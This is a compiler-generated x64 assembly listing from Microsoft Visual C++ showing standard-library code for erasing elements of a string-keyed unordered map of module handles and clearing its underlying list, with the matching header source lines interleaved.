;	COMDAT ?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z
_TEXT	SEGMENT
_Eraser$$sroa$153$1$ = 32
_End$1$ = 40
tv1106 = 48
_Bucket_bounds$1$ = 56
this$ = 112
_First$ = 120
_Last$ = 128
?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_erase, COMDAT

; 1023 :     _Nodeptr _Unchecked_erase(_Nodeptr _First, const _Nodeptr _Last) noexcept(_Nothrow_hash<_Traits, key_type>) {

$LN368:
	mov	rax, rsp
	push	rbp
	push	rsi
	push	r14
	sub	rsp, 80					; 00000050H
	mov	rbp, r8
	mov	rsi, rdx
	mov	r14, rcx

; 1024 :         if (_First == _Last) {

	cmp	rdx, r8
	je	$LN365@Unchecked_
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+40], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1034 :             const size_type _Bucket = bucket(_Traits::_Kfn(_Eraser._Next->_Myval)); // throws

	lea	r8, QWORD PTR [rdx+16]
	mov	r10, QWORD PTR [rcx+24]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r9, QWORD PTR [r8+16]
	mov	QWORD PTR [rax+16], rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1003 :             : _List(_List_), _Predecessor(_First_->_Prev), _Next(_First_) {}

	mov	rbx, rdx
	mov	QWORD PTR [rax+24], rdi
	mov	QWORD PTR [rax+32], r12
	mov	QWORD PTR [rax-32], r13
	mov	QWORD PTR [rax-40], r15

; 1025 :             return _Last;
; 1026 :         }
; 1027 : 
; 1028 :         const auto _End           = _List._Mypair._Myval2._Myhead;

	mov	rax, QWORD PTR [rcx+8]
	mov	QWORD PTR _End$1$[rsp], rax

; 1003 :             : _List(_List_), _Predecessor(_First_->_Prev), _Next(_First_) {}

	mov	rax, QWORD PTR [rdx+8]
	mov	QWORD PTR _Eraser$$sroa$153$1$[rsp], rax

; 1029 :         const auto _Bucket_bounds = _Vec._Mypair._Myval2._Myfirst;

	mov	QWORD PTR _Bucket_bounds$1$[rsp], r10
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN39@Unchecked_

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [r8]
$LN39@Unchecked_:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rdx, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	mov	r11, 1099511628211			; 00000100000001b3H
	test	r9, r9
	je	SHORT $LN50@Unchecked_
	npad	4
$LL323@Unchecked_:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rcx]
	inc	rcx
	xor	rdx, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rdx, r11
	cmp	rcx, r9
	jb	SHORT $LL323@Unchecked_
$LN50@Unchecked_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 852  :         return _Traitsobj(_Keyval) & _Mask;

	mov	r12, QWORD PTR [r14+48]
	and	r12, rdx

; 1035 :             // nothrow hereafter this block
; 1036 :             _Nodeptr& _Bucket_lo   = _Bucket_bounds[_Bucket << 1]._Ptr;

	shl	r12, 4
	add	r12, r10

; 1037 :             _Nodeptr& _Bucket_hi   = _Bucket_bounds[(_Bucket << 1) + 1]._Ptr;
; 1038 :             const bool _Update_lo  = _Bucket_lo == _Eraser._Next;
; 1039 :             const _Nodeptr _Old_hi = _Bucket_hi;

	mov	rax, QWORD PTR [r12+8]
	mov	r13, QWORD PTR [r12]
	mov	QWORD PTR tv1106[rsp], rax
$LL2@Unchecked_:

; 1006 :             const auto _Oldnext = _Next;

	mov	rdi, rbx

; 1040 :             for (;;) { // remove elements until we hit the end of the bucket
; 1041 :                 const bool _At_bucket_back = _Eraser._Next == _Old_hi;

	mov	r15, rbx

; 1007 :             _Next               = _Oldnext->_Next;

	mov	rbx, QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN91@Unchecked_
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN105@Unchecked_

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN244@Unchecked_

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN105@Unchecked_:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN91@Unchecked_:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+32], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1009 :             --_List._Mypair._Myval2._Mysize;

	dec	QWORD PTR [r14+16]

; 1042 :                 _Eraser._Bump_erased();
; 1043 :                 if (_At_bucket_back) {

	cmp	r15, QWORD PTR tv1106[rsp]
	je	SHORT $LN316@Unchecked_

; 1044 :                     break;
; 1045 :                 }
; 1046 : 
; 1047 :                 if (_Eraser._Next == _Last) {

	cmp	rbx, rbp
	jne	SHORT $LL2@Unchecked_

; 1048 :                     if (_Update_lo) {

	cmp	r13, rsi
	jne	SHORT $LN13@Unchecked_

; 1049 :                         // erased the bucket's prefix
; 1050 :                         _Bucket_lo = _Eraser._Next;

	mov	QWORD PTR [r12], rbx
$LN13@Unchecked_:

; 1013 :             _Predecessor->_Next = _Next;

	mov	rax, QWORD PTR _Eraser$$sroa$153$1$[rsp]
	mov	QWORD PTR [rax], rbx

; 1014 :             _Next->_Prev        = _Predecessor;

	mov	QWORD PTR [rbx+8], rax

; 1051 :                     }
; 1052 : 
; 1053 :                     return _Last;

	jmp	$LN364@Unchecked_
$LN316@Unchecked_:

; 1054 :                 }
; 1055 :             }
; 1056 : 
; 1057 :             if (_Update_lo) {

	cmp	r13, rsi
	mov	r13, QWORD PTR _Eraser$$sroa$153$1$[rsp]
	jne	SHORT $LN14@Unchecked_

; 1058 :                 // emptied the bucket
; 1059 :                 _Bucket_lo = _End;

	mov	rax, QWORD PTR _End$1$[rsp]
	mov	QWORD PTR [r12], rax

; 1060 :                 _Bucket_hi = _End;
; 1061 :             } else {

	jmp	SHORT $LN312@Unchecked_
$LN14@Unchecked_:

; 1062 :                 _Bucket_hi = _Predecessor;

	mov	rax, r13
$LN312@Unchecked_:

; 1063 :             }
; 1064 :         }
; 1065 : 
; 1066 :         // hereafter we are always erasing buckets' prefixes
; 1067 :         while (_Eraser._Next != _Last) {

	mov	QWORD PTR [r12+8], rax
	cmp	rbx, rbp
	je	$LN322@Unchecked_
	npad	11
$LL5@Unchecked_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rbx+40], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1068 :             const size_type _Bucket = bucket(_Traits::_Kfn(_Eraser._Next->_Myval)); // throws

	lea	r8, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r9, QWORD PTR [r8+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN181@Unchecked_

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [r8]
$LN181@Unchecked_:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	edx, edx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rcx, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r9, r9
	je	SHORT $LN192@Unchecked_
	mov	r13, 1099511628211			; 00000100000001b3H
	npad	3
$LL325@Unchecked_:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rdx]
	inc	rdx
	xor	rcx, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rcx, r13
	cmp	rdx, r9
	jb	SHORT $LL325@Unchecked_
	mov	r13, QWORD PTR _Eraser$$sroa$153$1$[rsp]
$LN192@Unchecked_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 852  :         return _Traitsobj(_Keyval) & _Mask;

	mov	r15, QWORD PTR [r14+48]
	and	r15, rcx

; 1069 :             // nothrow hereafter this block
; 1070 :             _Nodeptr& _Bucket_lo   = _Bucket_bounds[_Bucket << 1]._Ptr;

	shl	r15, 4
	add	r15, QWORD PTR _Bucket_bounds$1$[rsp]

; 1071 :             _Nodeptr& _Bucket_hi   = _Bucket_bounds[(_Bucket << 1) + 1]._Ptr;
; 1072 :             const _Nodeptr _Old_hi = _Bucket_hi;

	mov	r12, QWORD PTR [r15+8]
	npad	3
$LL7@Unchecked_:

; 1006 :             const auto _Oldnext = _Next;

	mov	rdi, rbx

; 1073 :             for (;;) { // remove elements until we hit the end of the bucket
; 1074 :                 const bool _At_bucket_back = _Eraser._Next == _Old_hi;

	mov	rsi, rbx

; 1007 :             _Next               = _Oldnext->_Next;

	mov	rbx, QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN233@Unchecked_
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN247@Unchecked_

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN244@Unchecked_

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN247@Unchecked_:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN233@Unchecked_:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+32], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1009 :             --_List._Mypair._Myval2._Mysize;

	dec	QWORD PTR [r14+16]

; 1075 :                 _Eraser._Bump_erased();
; 1076 :                 if (_At_bucket_back) {

	cmp	rsi, r12
	je	SHORT $LN318@Unchecked_

; 1077 :                     break;
; 1078 :                 }
; 1079 : 
; 1080 :                 if (_Eraser._Next == _Last) {

	cmp	rbx, rbp
	jne	SHORT $LL7@Unchecked_

; 1081 :                     // erased the bucket's prefix
; 1082 :                     _Bucket_lo = _Eraser._Next;

	mov	QWORD PTR [r15], rbx
$LN322@Unchecked_:

; 1013 :             _Predecessor->_Next = _Next;

	mov	QWORD PTR [r13], rbx

; 1014 :             _Next->_Prev        = _Predecessor;

	mov	QWORD PTR [rbx+8], r13
$LN364@Unchecked_:
	mov	r13, QWORD PTR [rsp+72]
	mov	r12, QWORD PTR [rsp+136]
	mov	rdi, QWORD PTR [rsp+128]
	mov	rbx, QWORD PTR [rsp+120]
	mov	r15, QWORD PTR [rsp+64]
$LN365@Unchecked_:

; 1093 :     }

	mov	rax, rbp
	add	rsp, 80					; 00000050H
	pop	r14
	pop	rsi
	pop	rbp
	ret	0
$LN318@Unchecked_:

; 1083 :                     return _Last;
; 1084 :                 }
; 1085 :             }
; 1086 : 
; 1087 :             // emptied the bucket
; 1088 :             _Bucket_lo = _End;

	mov	rcx, QWORD PTR _End$1$[rsp]
	mov	QWORD PTR [r15], rcx

; 1089 :             _Bucket_hi = _End;

	mov	QWORD PTR [r15+8], rcx
	cmp	rbx, rbp
	jne	$LL5@Unchecked_

; 1063 :             }
; 1064 :         }
; 1065 : 
; 1066 :         // hereafter we are always erasing buckets' prefixes
; 1067 :         while (_Eraser._Next != _Last) {

	jmp	SHORT $LN322@Unchecked_
$LN244@Unchecked_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN363@Unchecked_:
?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_erase
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?clear@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 48
?clear@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAXXZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::clear, COMDAT

; 1489 :     void clear() noexcept { // erase all

$LN6:
	push	rbx
	sub	rsp, 32					; 00000020H

; 1490 :         auto& _My_data = _Mypair._Myval2;
; 1491 :         _My_data._Orphan_non_end();
; 1492 :         _Node::_Free_non_head(_Getal(), _My_data._Myhead);

	mov	rdx, QWORD PTR [rcx]
	mov	rbx, rcx
	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >

; 1493 :         _My_data._Myhead->_Next = _My_data._Myhead;

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR [rax], rax

; 1494 :         _My_data._Myhead->_Prev = _My_data._Myhead;

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR [rax+8], rax

; 1495 :         _My_data._Mysize        = 0;

	mov	QWORD PTR [rbx+8], 0

; 1496 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
?clear@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAXXZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::clear
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??1_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::~_Range_eraser, COMDAT

; 1013 :             _Predecessor->_Next = _Next;

	mov	rdx, QWORD PTR [rcx+8]
	mov	rax, QWORD PTR [rcx+16]
	mov	QWORD PTR [rdx], rax

; 1014 :             _Next->_Prev        = _Predecessor;

	mov	rdx, QWORD PTR [rcx+16]
	mov	rax, QWORD PTR [rcx+8]
	mov	QWORD PTR [rdx+8], rax

; 1015 :         }

	ret	0
??1_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::~_Range_eraser
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
